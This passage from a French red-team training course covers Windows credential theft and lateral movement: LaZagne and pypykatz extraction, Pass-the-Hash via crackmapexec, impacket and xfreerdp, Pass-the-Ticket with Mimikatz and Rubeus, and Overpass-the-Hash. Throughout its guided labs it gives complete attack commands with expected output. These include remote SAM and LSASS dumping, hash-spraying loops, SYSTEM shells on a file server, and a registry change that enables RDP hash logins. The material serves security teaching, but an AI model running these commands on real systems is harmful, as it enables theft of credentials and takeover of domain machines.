| `pip install pypykatz` | Installe pypykatz, l'alternative Python à Mimikatz pour l'extraction offline de credentials |
| `pypykatz lsa minidump lsass.dmp` | Lit et analyse le fichier dump LSASS pour en extraire hashs NTLM, clés Kerberos et mots de passe |

#### Étape 6 : Extraction avec LaZagne

```powershell
# Extraction des mots de passe des navigateurs web uniquement
# (Chrome, Firefox, Edge, etc.)
.\lazagne.exe browsers
# Extraction complète de tous les mots de passe stockés
# -oN : exporte les résultats dans un fichier texte (format lisible)
.\lazagne.exe all -oN results_lazagne.txt
# Affiche le contenu du fichier de résultats dans la console
type results_lazagne.txt
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `.\lazagne.exe browsers` | Extrait les mots de passe des navigateurs web |
| `.\lazagne.exe all -oN results_lazagne.txt` | Extrait TOUS les mots de passe supportés. `-oN` : sortie au format texte dans `results_lazagne.txt` |
| `type results_lazagne.txt` | Affiche le contenu du fichier texte dans le terminal (équivalent de `cat` sur Linux) |

#### Étape 7 : Synthèse des credentials extraits

```bash
=== CREDENTIALS EXTRAITS ===
Date: 02/06/2026
Machine: CORP-PC01 (10.0.1.15)
Utilisateur: CORP\jdupont

--- Hashs NTLM ---
jdupont:31d6cfe0d16ae931b73c59d7e0c089c0
administrateur:8846f7eaee8fb117ad06bdd830b7586c

--- Clés Kerberos ---
administrateur (AES256): 6b7a8f9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f
administrateur (RC4): 8846f7eaee8fb117ad06bdd830b7586c

--- Mots de passe en clair ---
jdupont (webmail): S3cr3tMail!
jdupont (WiFi): W1f1_C0rp_2026!
```

---

## 3. Pass-the-Hash (PtH — T1550.002)

### 3.1 Principe

Le **Pass-the-Hash (PtH)** est une technique qui permet de s'authentifier sur un système distant en utilisant le **hash NTLM** d'un mot de passe, sans jamais connaître le mot de passe en clair.

**Fonctionnement :**

```
┌─────────────────────┐                     ┌─────────────────────┐
│  Machine attaquante │                     │  Machine cible      │
│                     │                     │                     │
│  Hash NTLM connu    │  ──── NTLM Auth ──> │  Vérification du   │
│  (ex: 31d6cfe0...)  │                     │  hash dans SAM/AD  │
│                     │  <─── Accès ───────  │                     │
└─────────────────────┘                     └─────────────────────┘
```

**Pourquoi ça marche ?**

Le protocole d'authentification NTLM (et LM) n'utilise jamais le mot de passe en clair. Il utilise son hash :

1. Le client envoie une demande d'authentification
2. Le serveur répond avec un **challenge** (nombre aléatoire)
3. Le client calcule : `response = HMAC(NT_hash, challenge)`
4. Le serveur vérifie : `response == HMAC(stored_hash, challenge)`

L'attaquant n'a pas besoin du mot de passe, seulement du hash.

### 3.2 Outils pour le Pass-the-Hash

#### crackmapexec (CrackMapExec)

Outil polyvalent pour tester des credentials sur un réseau Windows.

```bash
# Installation de CrackMapExec (outil Python de post-exploitation Windows)
pip install crackmapexec

# Vérifie si le hash NTLM de l'Administrateur fonctionne sur la cible 10.0.1.50
# protocole : smb, cible : 10.0.1.50, user : Administrator, hash : NTLM
# Si (Pwn3d!) s'affiche, l'utilisateur est admin et l'exécution de commande est possible
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Test avec un hash complet au format LM:NTLM (LM peut être vide avec aad3b4...)
crackmapexec smb 10.0.1.50 -u jdupont -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Test du même hash sur une plage d'adresses IP (10.0.1.50 à 10.0.1.55)
# Permet de trouver rapidement les machines partageant le même admin local
crackmapexec smb 10.0.1.50-55 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Exécution d'une commande distante sur la cible (ici : whoami)
# -x : spécifie la commande shell à exécuter sur la machine distante
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x whoami

# Liste les partages SMB disponibles sur la cible (C$, ADMIN$, etc.)
# Utile pour trouver des dossiers partagés accessibles
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c --shares

# Module "sam" : dump du Security Account Manager de la cible à distance
# Extrait les hashs des comptes locaux de la machine distante
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -M sam

# Module "lsassy" : dump de LSASS à distance (via DLL injection ou parsing)
# Extrait les hashs et tickets des sessions actives sur la cible
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -M lsassy
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `crackmapexec` | Outil de post-exploitation pour tester des credentials sur un domaine Windows |
| `smb` | Protocole utilisé (SMB sur port 445). Autres protocoles : `winrm`, `rdp`, `ssh`, `ldap` |
| `10.0.1.50` | Adresse IP de la cible. Plage possible : `10.0.1.50-55` (test de 6 machines) |
| `-u Administrator` | Nom d'utilisateur à tester |
| `-H HASH` | Hash NTLM (format `LM:NTLM` ou `:NTLM` si LM vide) |
| `-x whoami` | Exécute une commande shell (`cmd.exe /c`) sur la cible distante |
| `--shares` | Liste les partages SMB accessibles (C$, ADMIN$, IPC$, etc.) |
| `-M sam` | Active le module `sam` pour dump des comptes locaux distants |
| `-M lsassy` | Active le module `lsassy` pour dump LSASS distant |
| `(Pwn3d!)` | Indique que l'utilisateur a les droits administrateur sur la cible et que l'exécution de commande est possible |

**Sortie typique :**

```
SMB         10.0.1.50      445    FILESERVER      [*] Windows 10.0 Build 20348 x64 (name:FILESERVER) (domain:corp.local)
SMB         10.0.1.50      445    FILESERVER      [+] corp.local\Administrator:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)
```

Le `(Pwn3d!)` indique que l'utilisateur a les droits administrateur et que l'exécution de commande distante est possible.

#### impacket-psexec

```bash
# Installation du framework Impacket (ensemble d'outils Python pour protocoles Windows)
pip install impacket

# Connexion avec hash NTLM complet (LM:NTLM) sur la cible 10.0.1.50
# Format : <domaine>/<utilisateur>@<cible>
# -hashes : spécifie le hash au format LM:NTLM (LM peut être mis à vide)
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/jdupont@10.0.1.50

# Connexion en tant qu'Administrateur avec hash uniquement NTLM (LM vide)
# Le ":" avant le hash signifie que LM est vide (format attendu)
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50

# Exécution d'une commande non interactive (sans shell interactif)
# whoami est passé en argument et exécuté sur la cible, puis le programme se termine
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50 whoami
```

**Paramètres importants :**

| Option | Description |
|---|---|
| `-hashes LMHASH:NTHASH` | Hash NTLM. Format : `LM:HASH` (LM peut être `aad3b4...` ou vide avec `:HASH`). Le LM hash est souvent `aad3b435b51404eeaad3b435b51404ee` (hash de mot de passe vide) |
| `DOMAIN/user@IP` | Format de la cible : nom NetBIOS du domaine, nom d'utilisateur, adresse IP ou FQDN de la cible |
| `-codec` | Encodage de caractères pour le shell distant (ex: `-codec utf-8` pour éviter les problèmes d'affichage) |
| `whoami` | Commande à exécuter (mode non interactif : exécute et quitte) |

#### xfreerdp /pth

```bash
# Connexion RDP avec Pass-the-Hash via FreeRDP
# /v : adresse IP ou hostname de la cible
# /u : nom d'utilisateur
# /pth : hash NTLM (option spécifique FreeRDP pour le PtH)
# /cert:ignore : ignore les erreurs de certificat RDP (utile en lab)
# Note : nécessite que le Restricted Admin Mode soit activé sur la cible
xfreerdp /v:10.0.1.50 /u:Administrator /pth:8846f7eaee8fb117ad06bdd830b7586c /cert:ignore
```

**Prérequis : Restricted Admin Mode**

```powershell
# Active le Restricted Admin Mode sur la cible (nécessite admin local)
# DisableRestrictedAdmin = 0 → RDM activé (autorise le PtH RDP)
# /v : nom de la valeur à créer/modifier
# /t REG_DWORD : type de la valeur (DWORD 32 bits)
# /d 0 : données = 0 (0 = RDM activé, 1 = RDM désactivé)
# /f : force l'écriture sans confirmation
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# Vérifie l'état actuel du Restricted Admin Mode
# Affiche la valeur de DisableRestrictedAdmin
# 0 = activé (PtH RDP possible), 1 = désactivé
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `xfreerdp /v:... /u:... /pth:... /cert:ignore` | Client RDP FreeRDP avec option PtH. `/pth:` permet le Pass-the-Hash directement supporté par FreeRDP |
| `reg add "HKLM\..." /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f` | Ajoute/modifie la valeur `DisableRestrictedAdmin` dans la ruche LSA. `0` = Restricted Admin Mode activé (autorise les connexions RDP avec hash uniquement, sans mot de passe en clair) |
| `reg query "HKLM\..." /v DisableRestrictedAdmin` | Interroge la valeur du registre pour vérifier l'état actuel du RDM |

#### wmiexec.py (impacket)

```bash
# Connexion WMI avec hash NTLM via impacket
# Utilise le protocole WMI/DCOM (port 135) au lieu de SMB
# Plus discret que PsExec car ne crée pas de service Windows
impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-wmiexec` | Outil Impacket pour exécution de commandes à distance via WMI (Windows Management Instrumentation). Utilise `Win32_Process.Create` pour créer des processus |
| `-hashes :8846...` | Authentification par hash NTLM (LM vide, NTLM = 8846...) |
| `corp.local/Administrator@10.0.1.50` | Format : `DOMAINE/UTILISATEUR@CIBLE` |

**Différence entre wmiexec et psexec :**

| Critère | psexec.py | wmiexec.py |
|---|---|---|
| Mécanisme | Service SVC | WMI (Win32_Process) |
| Événements Windows | 4697 (création service) | 4688 (création process) |
| Binaire uploadé | Oui (service exe) | Non (inline WMI) |
| Discrétion | Moins discret | Plus discret |
| Dépendance | Admin$ accessible | RPC/WMI accessible |

### 3.3 Limitations du Pass-the-Hash

#### WinRM / PowerShell Remoting

Par défaut, **WinRM (5985/5986) ne supporte pas l'authentification NTLM avec un hash**. Il nécessite un mot de passe en clair ou un ticket Kerberos.

```bash
# Tentative de connexion WinRM avec hash (échec attendu)
# -i : cible (IP ou hostname)
# -u : utilisateur
# -H : hash NTLM
# WinRM n'accepte PAS l'authentification NTLM par hash direct.
# Il nécessite un mot de passe en clair ou un ticket Kerberos.
evil-winrm -i 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
# Erreur : WinRM ne supporte pas le PtH par défaut
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `evil-winrm -i 10.0.1.50 -u Administrator -H 8846...` | Tentative de connexion WinRM avec PtH. `-H` = hash NTLM. Échoue car WinRM nécessite soit mot de passe en clair (`-p`), soit ticket Kerberos (`-k`) |
| `-i` | IP ou hostname de la cible |
| `-u` | Nom d'utilisateur |
| `-H` | Hash NTLM pour authentification (non supporté par WinRM) |

**Contournements :**
1. **Overpass-the-Hash** (section 5) : convertir le hash en ticket Kerberos
2. **SMB** : utiliser SMB exec à la place

#### SMB selon la configuration

| Configuration | Impact sur PtH SMB |
|---|---|
| Windows Defender Firewall | Bloque SMB (445) si désactivé |
| SMB Signing requis | Peut bloquer certaines attaques de relais, mais pas le PtH direct |
| LSA Protection | Empêche le dump de LSASS, mais pas l'utilisation des hashs |
| Credential Guard | Protège les tickets, le PtH reste possible avec les bons hashs |

### 3.4 TP Guidé : Se connecter à une machine distante avec PtH

#### Objectif

Depuis Kali Linux, se connecter à une machine Windows distante via 3 méthodes : CrackMapExec, impacket-psexec, impacket-wmiexec.

#### Prérequis

- Machine cible : Windows Server 2022 (`FILESERVER`) — 10.0.1.50
- Compte : `Administrator` avec hash NTLM `8846f7eaee8fb117ad06bdd830b7586c`
- Machine attaquante : Kali Linux

#### Étape 1 : Test de connexion

```bash
# Teste le hash Administrateur sur FILESERVER via SMB
# Vérifie si le hash est valide et si l'utilisateur a les droits admin
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
# Sortie attendue :
# SMB         10.0.1.50       445    FILESERVER      [+] corp.local\Administrator:8846f7eaee8fb117ad06bdd830b7586c (Pwn3d!)
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `crackmapexec smb 10.0.1.50 -u Administrator -H 8846...` | Test d'authentification SMB avec PtH. Le `(Pwn3d!)` dans la sortie confirme que le compte est administrateur local sur la cible |

**Questions :**
1. Quelle est la signification de `(Pwn3d!)` ?
2. Quels sont les partages SMB accessibles ?
3. Le hash fonctionne-t-il sur d'autres machines ?

#### Étape 2 : Shell interactif avec impacket-psexec

```bash
# Obtient un shell interactif (cmd.exe) sur FILESERVER via PsExec
# en utilisant le hash Administrateur. Le service PSEXESVC est créé
# temporairement sur la cible pour permettre l'exécution de commandes.
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50
```

```cmd
# Dans le shell distant (cmd.exe) :
# Affiche l'identité du processus courant (SYSTEM = plus haut niveau)
C:\Windows\system32> whoami
# nt authority\system

# Affiche le nom de la machine distante
C:\Windows\system32> hostname
# FILESERVER

# Affiche la configuration réseau de la cible (interfaces, IP, etc.)
C:\Windows\system32> ipconfig
# Liste les membres du groupe Administrateurs local
C:\Windows\system32> net localgroup administrators
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-psexec -hashes :8846... corp.local/Administrator@10.0.1.50` | Shell interactif distant via PsExec. L'option sans commande finale ouvre un shell (cmd.exe) |
| `whoami` | Dans le shell distant, affiche `nt authority\system` (le service PsExec tourne sous SYSTEM) |
| `hostname` | Affiche le nom de la machine distante |
| `ipconfig` | Affiche la configuration réseau de la cible |
| `net localgroup administrators` | Liste les membres du groupe Administrateurs local (utile pour trouver d'autres comptes privilégiés) |

#### Étape 3 : Shell discret avec impacket-wmiexec

```bash
# Obtient un shell distant via WMI (plus discret que PsExec)
# Utilise Win32_Process.Create pour exécuter des processus
# Ne crée PAS de service Windows (EventID 4688 vs 4697 pour PsExec)
# Pas de binaire uploadé sur la cible
impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-wmiexec -hashes :8846... corp.local/Administrator@10.0.1.50` | Shell distant via WMI. Plus discret car : pas d'upload de binaire, pas de création de service, utilise uniquement les API WMI standard |

**Comparer les logs Windows générés :**

| Méthode | EventID | Log |
|---|---|---|
| **psexec.py** | 4697 | Création de service |
| **psexec.py** | 4624 | Session SMB |
| **wmiexec.py** | 4688 | Création de processus (cmd.exe) |
| **wmiexec.py** | 4624 | Session réseau (type 3) |

#### Étape 4 : Tester les limitations

```bash
# Tentative de connexion WinRM avec hash (échec attendu)
# WinRM n'accepte pas l'authentification NTLM par hash
evil-winrm -i 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Vérifie si le Restricted Admin Mode est activé sur la cible
# Permet de savoir si le PtH RDP est possible
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -M rdp
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `evil-winrm -i 10.0.1.50 -u Administrator -H 8846...` | Échoue car WinRM ne supporte pas l'authentification NTLM par hash (`-H`). Solution : Overpass-the-Hash pour convertir le hash en ticket Kerberos |
| `crackmapexec ... -M rdp` | Module `rdp` : vérifie si le Restricted Admin Mode est activé sur la cible (permet le PtH RDP) |

#### Étape 5 : Automatisation

```bash
# Exécute "whoami" sur plusieurs machines simultanément (10.0.1.50 à 55)
# Utile pour cartographier rapidement les machines accessibles avec un hash
crackmapexec smb 10.0.1.50-55 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x whoami

# Boucle bash : teste chaque hash d'un fichier contre chaque machine
# Technique de "credential spraying" : pour chaque hash du fichier hashes.txt,
# on tente une connexion SMB sur la plage d'adresses
for hash in $(cat hashes.txt); do
    crackmapexec smb 10.0.1.50-55 -u Administrator -H "$hash"
done

# Dump des hashs SAM de la cible distante
# Extrait les comptes locaux de FILESERVER (Administrateur local, etc.)
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c -M sam
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `crackmapexec smb 10.0.1.50-55 -u Administrator -H HASH -x whoami` | Exécute `whoami` sur 6 machines (50 à 55) pour confirmer l'accès |
| `for hash in $(cat hashes.txt); do ... done` | Boucle shell : lit chaque ligne du fichier `hashes.txt` et teste le hash contre la plage de cibles. Technique de "hash spraying" |
| `crackmapexec ... -M sam` | Module `sam` : dump des hashs des comptes locaux de la cible distante via le service de registre remote |

---

## 4. Pass-the-Ticket (PtT — T1550.003)

### 4.1 Principe

Le **Pass-the-Ticket (PtT)** consiste à utiliser un ticket Kerberos (TGT ou TGS) pour s'authentifier sur des services distants sans connaître le mot de passe.

**Rappel du fonctionnement de Kerberos :**

```
┌──────────────┐    1. AS-REQ      ┌────────────────┐
│   Client     │ ────────────────>  │   KDC (DC)     │
│  (utilisateur)│                   │  (KRBTGT)      │
│              │ <────────────────  │                │
│              │   2. AS-REP (TGT)  │                │
│              │                   │                │
│              │    3. TGS-REQ     │                │
│              │ ────────────────>  │                │
│              │ <────────────────  │                │
│              │  4. TGS-REP (TGS) │                │
│              │                   │                │
│              │   5. AP-REQ (TGS) │                │
│              │ ────────────────>  │   Service      │
│              │ <────────────────  │                │
│              │   6. AP-REP       │                │
└──────────────┘                   └────────────────┘
```

**Étapes :**
1. **AS-REQ** : Le client demande un TGT au KDC avec son hash NTLM
2. **AS-REP** : Le KDC répond avec un TGT (chiffré avec la clé KRBTGT)
3. **TGS-REQ** : Le client demande un TGS pour un service spécifique
4. **TGS-REP** : Le KDC répond avec un TGS (chiffré avec la clé du service)
5. **AP-REQ** : Le client présente le TGS au service pour s'authentifier

**En PtT, l'attaquant saute les étapes 1-2 (ou 1-4) et injecte directement un ticket volé.**

### 4.2 Mimikatz : kerberos::ptt

#### Export d'un ticket existant

```mimikatz
# Obtention des droits de débogage pour accéder aux tickets LSASS
mimikatz # privilege::debug
# Parcourt et exporte tous les tickets Kerberos (TGT et TGS)
# des sessions actives vers des fichiers .kirbi dans le dossier courant
# /export : sauvegarde chaque ticket sur le disque au format .kirbi
mimikatz # sekurlsa::tickets /export
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `privilege::debug` | Active SeDebugPrivilege pour lire LSASS |
| `sekurlsa::tickets /export` | Exporte tous les tickets Kerberos en mémoire vers des fichiers `.kirbi`. Chaque ticket est nommé selon son utilisateur et son service cible (ex: `jdupont@krbtgt-CORP.LOCAL.kirbi` pour un TGT) |

**Fichiers créés :** (exemple)
```
[0;12d687]-0-0-40a50000-jdupont@krbtgt-CORP.LOCAL.kirbi
```

#### Injection d'un ticket exporté

```mimikatz
# Purge (supprime) tous les tickets Kerberos du cache actuel
# Permet de repartir à zéro avant d'injecter un ticket volé
mimikatz # kerberos::purge
# Injecte le ticket (TGT) dans le cache Kerberos de la session courante
# ptt = Pass-The-Ticket : charge le fichier .kirbi en mémoire
mimikatz # kerberos::ptt [0;12d687]-0-0-40a50000-jdupont@krbtgt-CORP.LOCAL.kirbi
# Liste les tickets actuellement dans le cache pour confirmer l'injection
mimikatz # kerberos::list
```

**Test après injection :**
```cmd
# Affiche les tickets Kerberos dans le cache de la session Windows
# Confirme que le TGT injecté est présent et valide
klist
# Tente d'accéder au partage ADMIN$ du contrôleur de domaine
# Si le TGT est valide, l'accès est accordé sans mot de passe
dir \\DC01\C$
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `kerberos::purge` | Vide le cache Kerberos de la session courante (supprime tous les tickets) |
| `kerberos::ptt FICHIER.kirbi` | Pass-The-Ticket : injecte le ticket `.kirbi` dans le cache Kerberos. La session courante utilise maintenant l'identité du propriétaire du ticket |
| `kerberos::list` | Liste les tickets actuellement dans le cache (TGT et TGS) |
| `klist` | Commande Windows native qui affiche le cache Kerberos (alternative à `kerberos::list`) |
| `dir \\DC01\C$` | Test d'accès SMB au partage ADMIN$ du DC. Si l'injection du TGT a réussi, l'accès est accordé |

### 4.3 Rubeus : ptt

**Rubeus** est un outil C# pour la manipulation Kerberos.

```powershell
# Injection d'un ticket depuis un fichier .kirbi dans le cache Kerberos
# ptt = Pass-The-Ticket, /ticket = chemin du fichier .kirbi
Rubeus.exe ptt /ticket:ticket.kirbi

# Injection d'un ticket encodé en base64 (pratique pour transfert HTTP/API)
# Évite d'écrire un fichier sur le disque (plus discret)
Rubeus.exe ptt /ticket:doIE6jCCBO6gAwIBBaEDAgEWoo...

# Purge du cache avant injection (nettoie les tickets existants)
# /purge : vide le cache Kerberos avant d'injecter le nouveau ticket
Rubeus.exe ptt /ticket:ticket.kirbi /purge

# Liste tous les tickets présents dans le cache Kerberos
# Affiche les détails : utilisateur, service, expiration, type de chiffrement
Rubeus.exe triage

# Exporte tous les tickets du cache vers des fichiers .kirbi
# Utile pour voler des tickets supplémentaires
Rubeus.exe dump
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `Rubeus.exe ptt /ticket:FICHIER.kirbi` | Injecte un ticket `.kirbi` dans le cache Kerberos |
| `Rubeus.exe ptt /ticket:BASE64` | Injecte un ticket depuis sa représentation base64 (sans fichier disque) |
| `Rubeus.exe ptt /ticket:... /purge` | Purge le cache avant d'injecter (évite les conflits de tickets) |
| `Rubeus.exe triage` | Liste les tickets en cache avec leurs propriétés (utilisateur, SPN, expiration, chiffrement, etc.) |
| `Rubeus.exe dump` | Exporte tous les tickets du cache au format base64/.kirbi |

### 4.4 Conversion de tickets

| Format | Description | Utilisation |
|---|---|---|
| **.kirbi** | Format binaire Mimikatz (base64+header) | Mimikatz, Rubeus |
| **.ccache** | MIT Credential Cache | impacket, outils Linux |
| **Base64** | Ticket encodé en base64 (format Rubeus) | Transfert HTTP |

**kirbi → ccache :**

```bash
# Convertit le ticket du format .kirbi (Mimikatz) vers .ccache (MIT)
# pour utilisation avec les outils impacket sur Linux
impacket-ticketConverter ticket.kirbi ticket.ccache
```

**Utilisation du ticket ccache sur Linux :**

```bash
# Définit la variable d'environnement KRB5CCNAME qui pointe vers le ticket ccache
# Tous les outils Kerberos utiliseront ce fichier pour l'authentification
export KRB5CCNAME=/path/to/ticket.ccache
# Affiche le contenu du cache Kerberos (vérifie que le ticket est chargé)
klist
# Connexion SMB à DC01 en utilisant le ticket (sans mot de passe)
# -k : utilise l'authentification Kerberos
# -no-pass : ne demande pas de mot de passe (utilise le ticket)
impacket-smbexec -k -no-pass corp.local/Administrator@DC01.corp.local
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-ticketConverter ticket.kirbi ticket.ccache` | Convertit le ticket du format `.kirbi` (Mimikatz) vers `.ccache` (MIT, utilisable sur Linux) |
| `export KRB5CCNAME=/path/to/ticket.ccache` | Variable d'environnement : indique aux outils Kerberos où trouver le cache de tickets. Sans cette variable, `klist` et impacket ne trouveront pas le ticket |
| `klist` | Affiche les tickets dans le cache Kerberos (liste des tickets disponibles) |
| `impacket-smbexec -k -no-pass DOMAIN/USER@HOST` | Connexion SMB avec authentification Kerberos. `-k` = mode Kerberos, `-no-pass` = pas de mot de passe (ticket déjà présent dans KRB5CCNAME) |

### 4.5 TP Guidé : Injecter un ticket Kerberos

#### Objectif

1. Exporter le TGT de la session en cours
2. Purger les tickets
3. Injecter le TGT exporté
4. Vérifier l'accès au contrôleur de domaine
5. Convertir le ticket pour utilisation depuis Linux

#### Étape 1 : Export du TGT

```powershell
# Se déplace dans le répertoire de travail contenant les outils
cd C:\Windows\Temp\redteam
# Lance Mimikatz
.\mimikatz.exe

# Active le privilège de débogage pour accéder à LSASS
mimikatz # privilege::debug
# Exporte tous les tickets Kerberos (dont le TGT) en fichiers .kirbi
# Les fichiers sont créés dans le dossier courant
mimikatz # sekurlsa::tickets /export
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `.\mimikatz.exe` | Lance Mimikatz |
| `privilege::debug` | Active SeDebugPrivilege |
| `sekurlsa::tickets /export` | Exporte les tickets en fichiers .kirbi dans le dossier courant |

#### Étape 2 : Purge et injection

```powershell
# Supprime tous les tickets du cache Kerberos de la session courante
mimikatz # kerberos::purge
# Vérifie que le cache est bien vide (aucun ticket)
klist
# Sortie : Aucun ticket Kerberos en cache

# Injecte le TGT exporté précédemment dans le cache
# Passage de l'identité jdupont à la session courante
mimikatz # kerberos::ptt [0;12d687]-0-0-40a50000-jdupont@krbtgt-CORP.LOCAL.kirbi
# Liste les tickets injectés pour confirmation
mimikatz # kerberos::list
# Quitte Mimikatz
mimikatz # exit
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `kerberos::purge` | Purge le cache Kerberos |
| `klist` | Commande Windows native pour lister les tickets en cache |
| `kerberos::ptt FICHIER.kirbi` | Injecte le ticket .kirbi dans le cache (Pass-the-Ticket) |
| `kerberos::list` | Liste les tickets dans le cache via Mimikatz |
| `exit` | Quitte Mimikatz |

#### Étape 3 : Vérification

```cmd
# Vérifie que le TGT est bien présent dans le cache Kerberos
klist
# Test d'accès SMB au partage SYSVOL du contrôleur de domaine
# SYSVOL est accessible en lecture par tout utilisateur du domaine
# Si l'accès fonctionne, le TGT est valide et l'identité est reconnue
dir \\DC01\SYSVOL\corp.local
# Test d'accès au partage ADMIN$ de FILESERVER
# Confirme que le TGT permet l'accès aux ressources du domaine
dir \\FILESERVER\C$
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `klist` | Liste les tickets dans le cache (confirme la présence du TGT) |
| `dir \\DC01\SYSVOL\corp.local` | Accède au partage SYSVOL du DC (accessible à tous les utilisateurs du domaine, test d'authentification) |
| `dir \\FILESERVER\C$` | Accède au partage ADMIN$ de FILESERVER (test d'accès administratif) |

**Questions :**
1. Pourquoi le TGT permet d'accéder à plusieurs services ?
2. Quelle est la durée de validité d'un TGT par défaut ?
3. Que se passe-t-il si on injecte un TGT expiré ?

#### Étape 4 : Export du ticket en ccache pour Linux

```bash
# Copie les tickets .kirbi depuis la machine Windows vers Kali via SCP
# user@windows-target : compte SSH sur la machine Windows
# ~/Temp/tickets/*.kirbi : chemin source des tickets sur Windows
# . : dossier courant sur Kali (destination)
scp user@windows-target:C:\Temp\tickets\*.kirbi .
# Convertit le(s) ticket(s) du format .kirbi vers .ccache (MIT)
# *.kirbi : peut prendre plusieurs fichiers en entrée
# ticket.ccache : fichier de sortie unique
impacket-ticketConverter *.kirbi ticket.ccache

# Définit la variable d'environnement pour le cache Kerberos
export KRB5CCNAME=/path/to/ticket.ccache
# Connexion SMB à FILESERVER en utilisant le ticket Kerberos
# -k : mode Kerberos, -no-pass : sans mot de passe
impacket-smbexec -k -no-pass corp.local/Administrator@FILESERVER.corp.local
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `scp user@host:chemin_src/*.kirbi .` | Copie sécurisée (SSH) des tickets .kirbi depuis Windows vers Linux |
| `impacket-ticketConverter *.kirbi ticket.ccache` | Convertit les tickets au format .ccache pour impacket |
| `export KRB5CCNAME=/path/to/ticket.ccache` | Définit le chemin du cache Kerberos pour les outils Linux |
| `impacket-smbexec -k -no-pass USER@HOST` | Connexion SMB Kerberos sans mot de passe (utilise le ticket) |

---

## 5. Overpass-the-Hash (T1550.002)

### 5.1 Principe

L'**Overpass-the-Hash** (également appelé Pass-the-Key ou PtH → TGT) est une technique qui **convertit un hash NTLM en ticket Kerberos TGT**. Cela permet :

1. De contourner les limitations du PtH (notamment WinRM qui refuse l'auth NTLM directe)
2. D'obtenir un TGT même sans avoir de session Kerberos active
3. D'utiliser des outils Kerberos qui ne supportent que l'auth par ticket

**Principe :**

```
Hash NTLM (RC4) ──> AS-REQ (avec RC4_HMAC) ──> KDC ──> TGT
```

### 5.2 Rubeus : asktgt

```powershell
# Demande un TGT au KDC (Contrôleur de Domaine) en utilisant le hash RC4 (NTLM)
# /user : nom de l'utilisateur pour lequel demander le TGT
# /rc4 : hash NTLM (RC4-HMAC) utilisé comme clé d'authentification
# /ptt : injecte automatiquement le ticket obtenu dans le cache Kerberos
# Effet : la session courante devient Administrator (sans mot de passe)
Rubeus.exe asktgt /user:Administrator /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt

# Même chose avec une clé AES256 (plus moderne que RC4)
# Si le domaine utilise AES256 par défaut, ce type d'auth est moins suspect
Rubeus.exe asktgt /user:Administrator /aes256:6b7a8f9c0d1e2f3a4b5c6d7e8f9a0b1c /ptt

# Demande un TGT SANS injection automatique
# /nowrap : affiche le ticket en base64 dans la console (sans /ptt)
# Utile pour récupérer le ticket et l'injecter plus tard ou le transférer
Rubeus.exe asktgt /user:Administrator /rc4:8846f7eaee8fb117ad06bdd830b7586c /nowrap

# Avec spécification explicite du domaine (si le domaine n'est pas détecté)
# /domain : force le nom de domaine pour la requête AS-REQ
Rubeus.exe asktgt /user:Administrator /domain:corp.local /rc4:8846f7eaee8fb117ad06bdd830b7586c /ptt
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `Rubeus.exe asktgt` | Demande un TGT au KDC (AS-REQ). Transforme un hash en ticket Kerberos = **Overpass-the-Hash** |
| `/user:Administrator` | Compte pour lequel demander le TGT |
